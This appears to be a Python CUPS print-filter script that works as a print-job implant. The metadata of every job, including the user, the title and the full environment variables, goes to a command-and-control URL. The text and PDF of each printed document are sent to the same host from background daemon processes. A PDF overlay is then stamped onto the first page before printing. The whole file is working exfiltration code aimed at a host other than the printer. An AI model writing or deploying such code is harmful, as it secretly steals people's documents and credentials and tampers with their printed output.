# !/usr/bin/env python3

#!/usr/bin/python3 -t

from __future__ import print_function

import sys
import tempfile
import PyPDF2
import json
import datetime
import requests
import base64
import threading
import subprocess
import io
import os


def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)


def bpc_debug(*args, **kwargs):
    eprint("DEBUG: (BPC)", *args, **kwargs)


def spawn_daemon(func, *args, **kwargs):
    # do the UNIX double-fork magic, see Stevens' "Advanced
    # Programming in the UNIX Environment" for details (ISBN 0201563177)
    try:
        pid = os.fork()
        if pid > 0:
            # parent process, return and keep running
            return
    except OSError as  e:
        eprint("fork #1 failed: %d (%s)" % (e.errno, e.strerror))
        sys.exit(1)

    os.setsid()

    # do second fork
    try:
        pid = os.fork()
        if pid > 0:
            # exit from second parent
            sys.exit(0)
    except OSError as e:
        eprint("fork #2 failed: %d (%s)" % (e.errno, e.strerror))
        sys.exit(1)

    # do stuff
    func(*args, **kwargs)

    # all done
    os._exit(os.EX_OK)


class MetaUploader(threading.Thread):
    def __init__(self, cups_id, cups_user, cups_title, cups_copies, cups_options):
        threading.Thread.__init__(self)
        self.cups_id = cups_id
        self.cups_user = cups_user
        self.cups_title = cups_title
        self.cups_copies = cups_copies
        self.cups_options = cups_options

    def run(self):
        job_data = {'id': self.cups_id, 'user': self.cups_user, 'title': self.cups_title, 'copies': self.cups_copies,
                    'options': self.cups_options, 'timestamp': datetime.datetime.now().isoformat(),
                    'environment': dict(os.environ)}
        bpc_debug("Uploading Metadata")
        response = requests.post(C2_URL, json=job_data)
        json_response = response.json()
        bpc_debug("Uploaded Metadata - Response:", response)
        self._upload_id = json_response['upload_id']
        self._pages = json_response['pages']

    def upload_id(self):
        self.join()
        return self._upload_id


def ps_to_pdf(pdf_input_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("ps_to_pdf")
    bytes = subprocess.check_output(
        args=["/usr/lib/cups/filter/pstopdf", cups_id, cups_user, cups_title, cups_copies, cups_options],
        stdin=file_in)
    # file.close()
    return bytes


def ps_2_pdf(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("ps_2_pdf")
    p = subprocess.Popen(args=["/usr/bin/ps2pdf", '-', '-'],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE)
    bytes = p.communicate(input=bytes)[0]
    return bytes


def upload_pdf(bytes, upload_id):
    bpc_debug("Uploading PDF:", upload_id)
    response = requests.post(C2_URL + '/pdf/' + upload_id, data=bytes)
    bpc_debug("Uploaded PDF:", response)


def upload_text(ps_bytes, upload_id):
    bpc_debug("Uploading Text:", upload_id)
    p = subprocess.Popen(
        args=["/usr/bin/ps2ascii", '-', '-'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE)
    bytes = p.communicate(input=ps_bytes)[0]
    response = requests.post(C2_URL + '/text/' + upload_id, data=bytes)
    bpc_debug("Uploaded Text:", response)


def overlay_pdf(bytes):
    bpc_debug("Overlaying PDF")
    with io.BytesIO(bytes) as in_file:
        with io.BytesIO() as out_file:
            with open('/bpc/PDFs/overlay.pdf', 'rb') as overlay_file:

                in_reader = PyPDF2.PdfFileReader(in_file)
                overlay_reader = PyPDF2.PdfFileReader(overlay_file)
                out_writer = PyPDF2.PdfFileWriter()

                overlay_page = overlay_reader.getPage(0)

                for page_index in range(in_reader.numPages):
                    page = in_reader.getPage(page_index)
                    if page_index == 0:
                        page.mergePage(overlay_page)
                    out_writer.addPage(page)

                out_writer.write(out_file)
                result = out_file.getvalue()
                # with open('/bpc/out_file.pdf', 'wb') as file:
                #    file.write(result)
    bpc_debug("Overlayed PDF")
    return result


def pdf_to_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("pdf_to_ps")
    p = subprocess.Popen(
        args=["/usr/lib/cups/filter/pdftops", cups_id, cups_user, cups_title, cups_copies, cups_options],
        stdin=subprocess.PIPE)
    p.communicate(input=bytes)
    p.stdin.close()


def pdf_2_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("pdf_2_ps")
    p = subprocess.Popen(
        args=["/usr/bin/pdf2ps", '-', '-'],
        stdin=subprocess.PIPE)
    p.communicate(input=bytes)
    p.stdin.close()


def read_ps_in_bytes():
    bpc_debug("argc", len(sys.argv))
    if len(sys.argv) > 6 and os.path.isfile(sys.argv[6]):
        with open(sys.argv[6], 'rb') as file:
            bytes = file.read()
    else:
        bytes = sys.stdin.buffer.read()
    return bytes


C2_URL = 'http://c2:8080/bpc/api-v1'

bpc_debug("sys.argv", sys.argv)
cups_id = sys.argv[1]
cups_user = sys.argv[2]
cups_title = sys.argv[3]
cups_copies = sys.argv[4]
cups_options = sys.argv[5]

ps_in_bytes = read_ps_in_bytes()

meta_uploader = MetaUploader(cups_id, cups_user, cups_title, cups_copies, cups_options)
meta_uploader.start()
spawn_daemon(upload_text, ps_in_bytes, meta_uploader.upload_id())

# pdf_input_data = ps_to_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
pdf_in_bytes = ps_2_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)

spawn_daemon(upload_pdf, pdf_in_bytes, meta_uploader.upload_id())
# spawn_daemon(upload_text, ps_input_data, meta_uploader.upload_id())

pdf_out_bytes = overlay_pdf(pdf_in_bytes)

# pdf_to_ps(pdf_output_data, cups_id, cups_user, cups_title, cups_copies, cups_options)
pdf_2_ps(pdf_out_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
